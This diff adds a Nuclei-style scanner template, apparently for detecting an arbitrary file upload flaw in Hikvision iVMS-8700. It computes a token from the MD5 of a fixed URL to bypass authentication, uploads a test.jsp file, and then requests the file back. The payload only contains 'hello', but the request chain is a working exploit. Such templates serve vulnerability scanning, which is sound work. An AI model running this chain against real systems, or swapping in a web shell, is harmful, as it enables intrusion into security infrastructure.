@@ -1,0 +1,69 @@
+id: Hikvision_18
+
+info:
+  name: 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传
+  author: YanXi
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+  
+variables:
+  a1: "{{RootURL}}"
+  a2: "{{a1}}/eps/api/resourceOperations/uploadsecretKeyIbuilding"
+  a3: "{{md5('{{a2}}')}}"
+  a4: "{{to_upper('{{a3}}')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |-
+        POST /eps/api/resourceOperations/upload?token={{a4}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+        Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
+        Cache-Control:max-age=0
+        Connection:close
+        Content-Length: 178
+
+        ------WebKitFormBoundaryGEJwjlojPo
+        Content-Disposition: form-data;name="fileUploader"; filename="test.jsp"
+        Content-Type: image/jpeg
+
+        hello
+        ------WebKitFormBoundaryGEJwjlojPo--
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'true'
+        internal: true
+        
+    extractors:
+      - type: regex
+        name: resourceUuid
+        part: body
+        internal: true 
+        regex:
+          - '([^"]{32})'
+
+  - raw:
+      - |+
+        GET /eps/upload/{{resourceUuid}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'hello'
